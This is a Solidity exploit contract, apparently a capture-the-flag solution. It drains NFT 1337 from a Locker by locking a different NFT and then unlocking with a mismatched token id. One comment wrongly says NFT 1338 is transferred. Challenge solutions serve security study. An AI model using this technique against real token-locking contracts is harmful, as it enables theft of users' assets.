// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import {Setup, GREY, GreyNFT, Locker} from "src/locker/Setup.sol";

contract Exploit {
    Setup setup;
    GREY grey;
    GreyNFT greyNFT;
    Locker locker;

    constructor(Setup _setup) {
        setup = _setup;
        grey = setup.grey();
        greyNFT = setup.greyNFT();
        locker = setup.locker();
    }

    function solve() external {
        // Claim 500 GREY
        setup.claim();

        // Mint NFT 1338
        grey.approve(address(greyNFT), 100e18);
        greyNFT.mintNFT(1338);

        // Lock NFT 1338 in a token lock
        greyNFT.approve(address(locker), 1338);
        uint256 lockId = locker.lockToken(address(greyNFT), 1338, 0, address(this));

        // Unlock NFT 1337
        locker.unlockToken(lockId, 1337);

        // Transfer NFT 1338 to msg.sender
        greyNFT.transferFrom(address(this), msg.sender, 1337);
    }
}
